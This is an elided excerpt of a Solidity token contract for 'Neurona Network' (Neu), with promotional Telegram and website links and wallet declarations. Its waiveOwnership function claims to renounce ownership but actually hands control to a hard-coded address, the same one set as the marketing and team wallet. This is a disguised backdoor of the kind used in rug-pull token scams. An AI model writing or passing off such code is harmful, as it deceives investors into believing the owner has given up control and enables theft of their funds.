...
/**
Telegram : https://t.me/neuronanetworkchannel
Website  :  https://neurona-network.live
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF48A03d462A5c9104929406835C216973f4AD225);
    }
...
contract NeuronaNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Neurona Network";
    string private _symbol = "Neu";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF48A03d462A5c9104929406835C216973f4AD225);
    address payable public teamWalletAddress = payable(0xF48A03d462A5c9104929406835C216973f4AD225);
